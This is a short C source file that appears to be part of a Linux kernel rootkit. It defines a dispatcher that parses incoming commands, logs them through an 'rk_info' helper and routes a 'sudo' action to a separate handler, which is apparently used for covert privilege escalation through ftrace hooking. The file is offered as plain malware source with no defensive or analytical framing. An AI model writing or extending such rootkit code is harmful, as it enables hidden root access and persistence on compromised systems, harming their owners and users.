// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

#include "../ftrace/ftrace_helper.h"
#include "../logger/logger.h"
#include "parser/parser.h"

#include "commands/sudo/sudo.h"

#include "dispatcher.h"

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

int dispatcher(const char *command) {
    rk_info("[dispatcher] dispatching command %s\n", command);

    char *action = NULL;
    char **argv = NULL;
    int argc = 0;

    int ret = 0;

    if (parse_command(command, &action, &argv, &argc) == 0) {
        rk_info("[dispatcher] action: %s with %d args\n", action, argc);

        for (int i = 0; i < argc; i++) {
            rk_info("[dispatcher] argv[%d]: %s\n", i, argv[i]);
        }

        if (strcmp(action, "sudo") == 0) {
            ret = sudo(argv, argc);
        }

        free_parsed_command(action, argv, argc);
    }

    return ret;
}

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////
